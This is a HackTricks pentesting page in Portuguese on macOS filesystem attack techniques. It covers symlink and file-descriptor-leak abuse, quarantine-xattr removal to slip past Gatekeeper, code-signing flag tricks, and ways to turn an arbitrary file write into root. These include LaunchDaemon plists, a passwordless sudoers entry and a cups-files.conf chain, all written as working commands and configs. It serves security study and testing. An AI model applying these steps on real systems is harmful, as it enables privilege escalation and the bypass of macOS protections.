# macOS FS Tricks

{{#include ../../../../banners/hacktricks-training.md}}

## Combinações de permissões POSIX

Para um **diretório**, os três bits de permissão têm um significado diferente do que têm em um arquivo comum. `chmod(1)` chama o bit de execução de "**search**" quando aplicado a um diretório:<sup>[[2]](#references)</sup>

> `0100` Para arquivos, permite a execução pelo proprietário. Para diretórios, permite que o proprietário faça **search** no diretório.

- **leitura** - você pode **enumerar** as entradas do diretório (listar os nomes).
- **escrita** - você pode **criar, renomear e excluir entradas** no diretório. Observe que isso é uma propriedade do diretório *contendo* o arquivo, não do arquivo: você pode excluir um arquivo que não consegue ler ou modificar, desde que possa escrever no diretório pai.
- Para excluir um **subdiretório**, ele deve estar vazio, o que, por sua vez, requer direitos suficientes para remover tudo dentro dele.
- Se o diretório tiver o **sticky bit** (`S_ISVTX`, como `/tmp`), isso será restrito — o POSIX estabelece que um processo só poderá remover ou renomear arquivos nele se for proprietário do arquivo, proprietário do diretório ou tiver privilégios apropriados.<sup>[[1]](#references)</sup>
- **execução / search** - você tem **permissão para atravessar** o diretório. A resolução do nome do caminho localiza cada componente "no diretório especificado por seu predecessor", portanto, **perder os direitos de search em qualquer componente individual do prefixo do caminho torna tudo abaixo dele inacessível por caminho**, mesmo que o próprio arquivo folha tenha leitura permitida para todos.<sup>[[1]](#references)</sup>

### Combinações perigosas

**Como sobrescrever um arquivo/pasta pertencente ao root**, mas:

- Um **proprietário do diretório** pai no caminho é o usuário
- Um **proprietário do diretório** pai no caminho é um **grupo de usuários** com **acesso de escrita**
- Um **grupo** de usuários tem **acesso de escrita** ao **arquivo**

Com qualquer uma das combinações anteriores, um atacante poderia **injetar** um **sym/hard link** no caminho esperado para obter uma arbitrary write privilegiada.

### Caso especial de R+X em uma pasta do root

Isso resulta diretamente da regra de resolução de nomes de caminho acima. Se um **diretório concede apenas R+X ao root**, os arquivos dentro dele ficam inacessíveis *por caminho* para todos os demais — mas os próprios bits de permissão dos **arquivos** ainda podem ser permissivos. O diretório é a única barreira.

Assim, qualquer primitive que permita tirar o arquivo **desse diretório** — um processo privilegiado que **move/renomeia/copia** um caminho escolhido pelo atacante para um local que você possa atravessar — transforma-se em uma arbitrary read, sem nunca precisar contornar o próprio modo do arquivo:
```bash
# Reproduce the primitive locally
sudo mkdir -p /tmp/locked && sudo chmod 700 /tmp/locked
sudo sh -c 'echo secret > /tmp/locked/data.txt; chmod 644 /tmp/locked/data.txt'

ls -l /tmp/locked/data.txt   # Permission denied: cannot even stat through the directory
cat /tmp/locked/data.txt     # Permission denied

# The file itself is mode 644 - only the parent directory's search bit blocks you.
sudo ls -l /tmp/locked/
```
Procure por movimentadores de arquivos privilegiados (instaladores, rotacionadores de logs, coletores de falhas/diagnósticos, recursos de backup e de "exportação") que aceitem um caminho de origem de um usuário com menos privilégios.

## Symbolic Link / Hard Link

### Arquivo/pasta permissivo

Se um processo privilegiado estiver gravando dados em um **arquivo** que possa ser **controlado** por um **usuário com menos privilégios**, ou que possa ter sido **criado anteriormente** por um usuário com menos privilégios. O usuário poderia simplesmente **apontá-lo para outro arquivo** por meio de um Symbolic ou Hard link, e o processo privilegiado gravará nesse arquivo.

Verifique as outras seções onde um atacante poderia **abusar de uma escrita arbitrária para escalar privilégios**.

### Open `O_NOFOLLOW`

De acordo com [`open(2)`](https://keith.github.io/xcode-man-pages/open.2.html): *"Se `O_NOFOLLOW` for usado na máscara e o arquivo de destino passado para `open()` for um link simbólico, então `open()` falhará."* Somente o componente **final** é verificado — todos os componentes **intermediários** ainda são resolvidos e seguidos. Portanto, um desenvolvedor que "protegeu" uma gravação com `O_NOFOLLOW` ainda pode ser atacado ao criar um symlink em qualquer **diretório pai** do caminho de destino.<sup>[[3]](#references)</sup>

A mesma man page documenta as flags que realmente fecham essa lacuna:<sup>[[3]](#references)</sup>

- **`O_NOFOLLOW_ANY`** — *"se ... qualquer componente do caminho passado para `open()` for um link simbólico, então `open()` falhará."*
- **`O_RESOLVE_BENEATH`** — *"se ... a resolução do caminho especificado escapar do diretório associado ao fd, então `openat()` falhará."*

Caso contrário, `openat()` relativo a um directory FD que você já validou, ou `realpath()` + revalidação, são as formas restantes de impedir trocas de symlink no caminho intermediário.

## .fileloc

Arquivos com a extensão **`.fileloc`** podem apontar para outros aplicativos ou binários; assim, quando forem abertos, o aplicativo/binário será executado.\
Exemplo:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>URL</key>
<string>file:///System/Applications/Calculator.app</string>
<key>URLPrefix</key>
<integer>0</integer>
</dict>
</plist>
```
## Descritores de Arquivo

### Leak FD (sem `O_CLOEXEC`)

Se uma chamada a `open` não tiver a flag `O_CLOEXEC`, o descritor de arquivo será herdado pelo processo filho. Portanto, se um processo privilegiado abrir um arquivo privilegiado e executar um processo controlado pelo atacante, o atacante **herdará o FD sobre o arquivo privilegiado**.

O exemplo canônico é o **LPE `DYLD_PRINT_TO_FILE` no OS X 10.10** ([SektionEins](https://www.sektioneins.de/en/blog/15-07-07-dyld_print_to_file_lpe.html)):<sup>[[4]](#references)</sup>

- `dyld` respeitava `DYLD_PRINT_TO_FILE=/path` até mesmo em **binários restritos (suid root)**, porque essa variável específica era analisada fora de `processDyldEnvironmentVariable()`.
- Ele executava `open(loggingPath, O_WRONLY | O_CREAT | O_APPEND, 0644)`, portanto **criava um arquivo pertencente ao root em um caminho arbitrário**.
- O FD **nunca era fechado e não tinha a flag close-on-exec**, portanto cada filho do binário suid herdava um **FD gravável para um arquivo pertencente ao root**.
- Executar, por exemplo, `DYLD_PRINT_TO_FILE=/etc/target suid_binary` e depois ler o número do FD herdado no filho permitia realizar gravações arbitrárias em arquivos pertencentes ao root; `fcntl(fd, F_SETFL, 0)` também removia `O_APPEND`, permitindo sobrescrever em vez de adicionar ao final.

O mesmo padrão aparece sempre que um processo privilegiado abre um arquivo **antes** de executar algo que você controla (ferramentas auxiliares, editores no estilo `crontab` invocados por meio de `$EDITOR`, arquivos de log/debug abertos a partir de um caminho definido por uma variável de ambiente...). Enumere os FDs que você herdou com:
```bash
# From inside the child process
ls -l /dev/fd/
# or
lsof -p $$
```
Qualquer coisa acima de `2` que aponte para um arquivo que você não consegue abrir por conta própria é uma primitive de arbitrary-write (ou arbitrary-read).

## Evite tricks de quarantine xattrs

### Remova-o
```bash
xattr -d com.apple.quarantine /path/to/file_or_app
```
### flag uchg / uchange / uimmutable

Se um arquivo/pasta tiver este atributo imutável, não será possível adicionar um xattr a ele
```bash
echo asd > /tmp/asd
chflags uchg /tmp/asd # "chflags uchange /tmp/asd" or "chflags uimmutable /tmp/asd"
xattr -w com.apple.quarantine "" /tmp/asd
xattr: [Errno 1] Operation not permitted: '/tmp/asd'

ls -lO /tmp/asd
# check the "uchg" in the output
```
### Sistemas de arquivos sem suporte a xattr

Nem todo sistema de arquivos que o macOS consegue montar armazena **atributos estendidos** nativamente. HFS+ e APFS oferecem esse suporte; **FAT32, exFAT e a maioria dos mounts NFS não** — o macOS os emula gravando um arquivo auxiliar **AppleDouble** chamado `._<filename>` ([The Eclectic Light Company](https://eclecticlight.co/2018/01/12/which-file-systems-and-cloud-services-preserve-extended-attributes/)).<sup>[[5]](#references)</sup>

Isso é importante para quarantine, pois o xattr só persiste se puder ser realmente gravado **e lido novamente** a partir do mesmo volume:
```bash
# Check whether a mount point round-trips xattrs at all
xattr -w com.apple.quarantine "0081;00000000;test;" /Volumes/SOMEUSB/file
xattr -p com.apple.quarantine /Volumes/SOMEUSB/file
ls -a /Volumes/SOMEUSB/          # look for the ._file AppleDouble companion
```
Se o volume for posteriormente lido por um caminho que ignora o companion `._` (ou se o companion for removido/excluído), o arquivo chegará **sem uma quarantine flag** — e um `.app` sem quarantine é suficiente para escapar do App Sandbox, conforme abordado em [macOS Sandbox Debug & Bypass](../macos-sandbox/macos-sandbox-debug-and-bypass/README.md#bypassing-quarantine-attribute).

### writeextattr ACL

Esta ACL impede a adição de `xattrs` ao arquivo
```bash
rm -rf /tmp/test*
echo test >/tmp/test
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" /tmp/test
ls -le /tmp/test
ditto -c -k test test.zip
# Download the zip from the browser and decompress it, the file should be without a quarantine xattr

cd /tmp
echo y | rm test

# Decompress it with ditto
ditto -x -k --rsrc test.zip .
ls -le /tmp/test

# Decompress it with open (if sandboxed decompressed files go to the Downloads folder)
open test.zip
sleep 1
ls -le /tmp/test
```
### **com.apple.acl.text xattr + AppleDouble**

O formato de arquivo **AppleDouble** copia um arquivo incluindo suas ACEs.

No [**código-fonte**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html), é possível ver que a representação de texto da ACL armazenada dentro do xattr chamado **`com.apple.acl.text`** será definida como ACL no arquivo descompactado. Portanto, se você compactar um aplicativo em um arquivo zip com o formato de arquivo **AppleDouble**, usando uma ACL que impeça a gravação de outros xattrs nele... o xattr de quarantine não será definido no aplicativo:

Consulte o [**relatório original**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/) para obter mais informações.<sup>[[6]](#references)</sup>

Para reproduzir isso, primeiro precisamos obter a string correta da ACL:
```bash
# Everything will be happening here
mkdir /tmp/temp_xattrs
cd /tmp/temp_xattrs

# Create a folder and a file with the acls and xattr
mkdir del
mkdir del/test_fold
echo test > del/test_fold/test_file
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold/test_file
ditto -c -k del test.zip

# uncomporess to get it back
ditto -x -k --rsrc test.zip .
ls -le test
```
(Observe que, mesmo que isso funcione, o sandbox grava o xattr de quarantine antes)

Não é realmente necessário, mas deixo isso aqui por precaução:


{{#ref}}
macos-xattr-acls-extra-stuff.md
{{#endref}}

## Bypass de verificações de assinatura

### Bypass de verificações de platform binaries

Algumas verificações de segurança verificam se o binário é um **platform binary**, por exemplo, para permitir a conexão com um serviço XPC. No entanto, conforme exposto em um bypass em https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/, é possível fazer bypass dessa verificação obtendo um platform binary (como /bin/ls) e injetando o exploit via dyld usando uma variável de ambiente `DYLD_INSERT_LIBRARIES`.<sup>[[7]](#references)</sup>

### Bypass das flags `CS_REQUIRE_LV` e `CS_FORCED_LV`

É possível que um binário em execução modifique suas próprias flags para fazer bypass das verificações com um código como:<sup>[[7]](#references)</sup>
```c
// Code from https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/
int pid = getpid();
NSString *exePath = NSProcessInfo.processInfo.arguments[0];

uint32_t status = SecTaskGetCodeSignStatus(SecTaskCreateFromSelf(0));
status |= 0x2000; // CS_REQUIRE_LV
csops(pid, 9, &status, 4); // CS_OPS_SET_STATUS

status = SecTaskGetCodeSignStatus(SecTaskCreateFromSelf(0));
NSLog(@"=====Inject successfully into %d(%@), csflags=0x%x", pid, exePath, status);
```
## Bypass Code Signatures

Os bundles contêm o arquivo **`_CodeSignature/CodeResources`**, que contém o **hash** de cada **arquivo** dentro do **bundle**. Observe que o hash de CodeResources também está **incorporado no executável**, portanto também não podemos alterá-lo.

No entanto, existem alguns arquivos cuja assinatura não será verificada; eles têm a chave omit no plist, como:
```xml
<dict>
...
<key>rules</key>
<dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
<key>rules2</key>
...
<key>^(.*/index.html)?\.DS_Store$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>2000</real>
</dict>
...
<key>^PkgInfo$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>20</real>
</dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
```
É possível calcular a assinatura de um recurso a partir da CLI com:
```bash
openssl dgst -binary -sha1 /System/Cryptexes/App/System/Applications/Safari.app/Contents/Resources/AppIcon.icns | openssl base64
```
## Montar dmgs

Um usuário pode montar um dmg personalizado criado até mesmo sobre algumas pastas existentes. É assim que você poderia criar um pacote dmg personalizado com conteúdo personalizado:
```bash
# Create the volume
hdiutil create /private/tmp/tmp.dmg -size 2m -ov -volname CustomVolName -fs APFS 1>/dev/null
mkdir /private/tmp/mnt

# Mount it
hdiutil attach -mountpoint /private/tmp/mnt /private/tmp/tmp.dmg 1>/dev/null

# Add custom content to the volume
mkdir /private/tmp/mnt/custom_folder
echo "hello" > /private/tmp/mnt/custom_folder/custom_file

# Detach it
hdiutil detach /private/tmp/mnt 1>/dev/null

# Next time you mount it, it will have the custom content you wrote

# You can also create a dmg from an app using:
hdiutil create -srcfolder justsome.app justsome.dmg
```
Normalmente, o macOS monta discos comunicando-se com o serviço Mach `com.apple.DiskArbitrarion.diskarbitrariond` (fornecido por `/usr/libexec/diskarbitrationd`). Se o parâmetro `-d` for adicionado ao arquivo plist dos LaunchDaemons e o serviço for reiniciado, os logs serão armazenados em `/var/log/diskarbitrationd.log`.\
No entanto, é possível usar ferramentas como `hdik` e `hdiutil` para se comunicar diretamente com o kext `com.apple.driver.DiskImages`.

## Escritas Arbitrárias

### Periodic sh scripts

Se o seu script puder ser interpretado como um **shell script**, você poderá sobrescrever o **`/etc/periodic/daily/999.local`** shell script, que será acionado todos os dias.

Você pode **simular** uma execução desse script com: **`sudo periodic daily`**

### Daemons

Escreva um **LaunchDaemon** arbitrário, como **`/Library/LaunchDaemons/xyz.hacktricks.privesc.plist`**, com um plist que execute um script arbitrário, como:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.sample.Load</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Scripts/privesc.sh</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
Gere apenas o script `/Applications/Scripts/privesc.sh` com os **comandos** que você gostaria de executar como root.

### Arquivo Sudoers

Se você tiver **arbitrary write**, poderá criar um arquivo dentro da pasta **`/etc/sudoers.d/`** concedendo a si mesmo privilégios de **sudo**.

### Arquivos PATH

O arquivo **`/etc/paths`** é um dos principais locais que preenchem a variável de ambiente PATH. Você precisa ser root para substituí-lo, mas, se um script de um **processo privilegiado** estiver executando algum **comando sem o caminho completo**, talvez seja possível fazer **hijack** modificando esse arquivo.

Você também pode gravar arquivos em **`/etc/paths.d`** para carregar novas pastas na variável de ambiente `PATH`.

### cups-files.conf

Essa técnica foi usada neste [writeup](https://www.kandji.io/blog/macos-audit-story-part1).<sup>[[8]](#references)</sup>

Crie o arquivo `/etc/cups/cups-files.conf` com o seguinte conteúdo:
```
ErrorLog /etc/sudoers.d/lpe
LogFilePerm 777
<some junk>
```
Isso criará o arquivo `/etc/sudoers.d/lpe` com permissões 777. O lixo extra no final serve para acionar a criação do log de erro.

Em seguida, escreva em `/etc/sudoers.d/lpe` a configuração necessária para escalar privilégios, como `%staff ALL=(ALL) NOPASSWD:ALL`.

Depois, modifique novamente o arquivo `/etc/cups/cups-files.conf`, indicando `LogFilePerm 700`, para que o novo arquivo sudoers se torne válido ao invocar `cupsctl`.

### Sandbox Escape

É possível escapar do sandbox do macOS com um arbitrary write no FS. Para alguns exemplos, consulte a página [macOS Auto Start](../../../../macos-auto-start-locations.md), mas uma técnica comum é escrever um arquivo de preferências do Terminal em `~/Library/Preferences/com.apple.Terminal.plist` que execute um comando na inicialização e chamá-lo usando `open`.

## Gerar arquivos graváveis como outros usuários

Um primitivo de privesc muito comum é fazer um **processo privilegiado criar um arquivo para você** em um diretório sob seu controle e, depois, manter **acesso de escrita** a esse arquivo. São necessários dois elementos:

1. Um diretório que pertença a você (ou no qual você possa definir uma **ACL herdável**), para que tudo o que for criado dentro dele herde suas permissões.
2. Um processo privilegiado/`suid` que possa receber instruções sobre **onde** criar um arquivo — normalmente por meio de uma variável de ambiente de debug/logging, um arquivo de configuração ou a API XPC de um helper.

A parte da **ACL herdável** é o que torna o arquivo criado gravável por você, mesmo que ele pertença a outro usuário. As flags de herança `file_inherit` / `directory_inherit` estão documentadas em [`chmod(1)`](https://keith.github.io/xcode-man-pages/chmod.1.html):<sup>[[2]](#references)</sup>
```bash
DIRNAME=/tmp/inherit_test
mkdir -p "$DIRNAME"

# file_inherit + directory_inherit => everything created inside is writable by me
chmod +a "$(whoami) allow read,write,append,execute,readattr,writeattr,readextattr,writeextattr,chown,delete,writesecurity,readsecurity,list,search,add_file,add_subdirectory,delete_child,file_inherit,directory_inherit" "$DIRNAME"

ls -lde "$DIRNAME"   # confirm the ACE is present
```
Agora qualquer arquivo que um processo privilegiado criar dentro de `$DIRNAME` será **gravável por você**. Se esse diretório também for um local que posteriormente seja **executado como root** (`/etc/periodic/*`, `/etc/cron.d`, `/etc/sudoers.d`, um diretório de LaunchDaemon...), isso é uma escalação direta para root. Consulte as seções [Sudoers File](#sudoers-file) e [cups-files.conf](#cups-filesconf) acima para saber o que escrever depois que você tiver o arquivo.

Para ver um exemplo completo da cadeia “uma variável de ambiente faz um processo root criar um arquivo, e o FD vaza para você”, consulte [Leak FD (no `O_CLOEXEC`)](#leak-fd-no-o_cloexec) acima.

## Memória compartilhada POSIX

A **memória compartilhada POSIX** permite que processos em sistemas operacionais compatíveis com POSIX acessem uma área de memória comum, facilitando uma comunicação mais rápida em comparação com outros métodos de comunicação entre processos. Isso envolve criar ou abrir um objeto de memória compartilhada com `shm_open()`, definir seu tamanho com `ftruncate()` e mapeá-lo no espaço de endereçamento do processo usando `mmap()`. Os processos podem então ler e gravar diretamente nessa área de memória. Para gerenciar o acesso concorrente e evitar corrupção de dados, mecanismos de sincronização, como mutexes ou semáforos, são frequentemente usados. Por fim, os processos desfazem o mapeamento e fecham a memória compartilhada com `munmap()` e `close()` e, opcionalmente, removem o objeto de memória com `shm_unlink()`. Esse sistema é especialmente eficaz para IPC eficiente e rápido em ambientes nos quais vários processos precisam acessar dados compartilhados rapidamente.

<details>

<summary>Exemplo de código do produtor</summary>
```c
// gcc producer.c -o producer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
const char *name = "/my_shared_memory";
const int SIZE = 4096; // Size of the shared memory object

// Create the shared memory object
int shm_fd = shm_open(name, O_CREAT | O_RDWR, 0666);
if (shm_fd == -1) {
perror("shm_open");
return EXIT_FAILURE;
}

// Configure the size of the shared memory object
if (ftruncate(shm_fd, SIZE) == -1) {
perror("ftruncate");
return EXIT_FAILURE;
}

// Memory map the shared memory
void *ptr = mmap(0, SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, shm_fd, 0);
if (ptr == MAP_FAILED) {
perror("mmap");
return EXIT_FAILURE;
}

// Write to the shared memory
sprintf(ptr, "Hello from Producer!");

// Unmap and close, but do not unlink
munmap(ptr, SIZE);
close(shm_fd);

return 0;
}
```
</details>

<details>

<summary>Exemplo de Código do Consumidor</summary>
```c
// gcc consumer.c -o consumer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
const char *name = "/my_shared_memory";
const int SIZE = 4096; // Size of the shared memory object

// Open the shared memory object
int shm_fd = shm_open(name, O_RDONLY, 0666);
if (shm_fd == -1) {
perror("shm_open");
return EXIT_FAILURE;
}

// Memory map the shared memory
void *ptr = mmap(0, SIZE, PROT_READ, MAP_SHARED, shm_fd, 0);
if (ptr == MAP_FAILED) {
perror("mmap");
return EXIT_FAILURE;
}

// Read from the shared memory
printf("Consumer received: %s\n", (char *)ptr);

// Cleanup
munmap(ptr, SIZE);
close(shm_fd);
shm_unlink(name); // Optionally unlink

return 0;
}

```
</details>

## Descritores Guarded do macOS

**descritores macOSCguarded** são um recurso de segurança introduzido no macOS para aumentar a segurança e a confiabilidade das **operações com file descriptors** em aplicações de usuário. Esses descritores guarded fornecem uma maneira de associar restrições específicas, ou "guards", aos file descriptors, que são aplicadas pelo kernel.

Esse recurso é particularmente útil para evitar certas classes de vulnerabilidades de segurança, como **acesso não autorizado a arquivos** ou **race conditions**. Essas vulnerabilidades ocorrem quando, por exemplo, uma thread acessa uma descrição de arquivo, dando a **outra thread vulnerável acesso a ela**, ou quando um file descriptor é **herdado** por um processo filho vulnerável. Algumas funções relacionadas a essa funcionalidade são:

- `guarded_open_np`: Abre um FD com um guard
- `guarded_close_np`: Fecha-o
- `change_fdguard_np`: Altera as flags do guard em um descritor (inclusive removendo a proteção do guard)

## References

- [1] [POSIX.1-2024 — Definições básicas, Cap. 4 (Permissões de acesso a arquivos, proteção de diretórios, resolução de nomes de caminho)](https://pubs.opengroup.org/onlinepubs/9799919799/basedefs/V1_chap04.html)
- [2] [`chmod(1)` página de manual](https://keith.github.io/xcode-man-pages/chmod.1.html) (directory search/execute bit, ACL inheritance flags)
- [3] [`open(2)` página de manual](https://keith.github.io/xcode-man-pages/open.2.html) (`O_NOFOLLOW`, `O_NOFOLLOW_ANY`, `O_RESOLVE_BENEATH`)
- [4] [SektionEins - Escalonamento local de privilégios DYLD_PRINT_TO_FILE no OS X 10.10](https://www.sektioneins.de/en/blog/15-07-07-dyld_print_to_file_lpe.html) (leaked FD without close-on-exec)
- [5] [The Eclectic Light Company - Quais sistemas de arquivos e serviços de cloud preservam atributos estendidos?](https://eclecticlight.co/2018/01/12/which-file-systems-and-cloud-services-preserve-extended-attributes/)
- [6] [Microsoft - O calcanhar de Aquiles do Gatekeeper: desenterrando uma vulnerabilidade do macOS](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/)
- [7] [Mickey (Jhftss) - Uma nova era de escapes do macOS Sandbox](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)
- [8] [Kandji - Descobrindo vulnerabilidades da Apple: a história da auditoria do diskarbitrationd e do storagekitd — Parte 1](https://www.kandji.io/blog/macos-audit-story-part1)
{{#include ../../../../banners/hacktricks-training.md}}
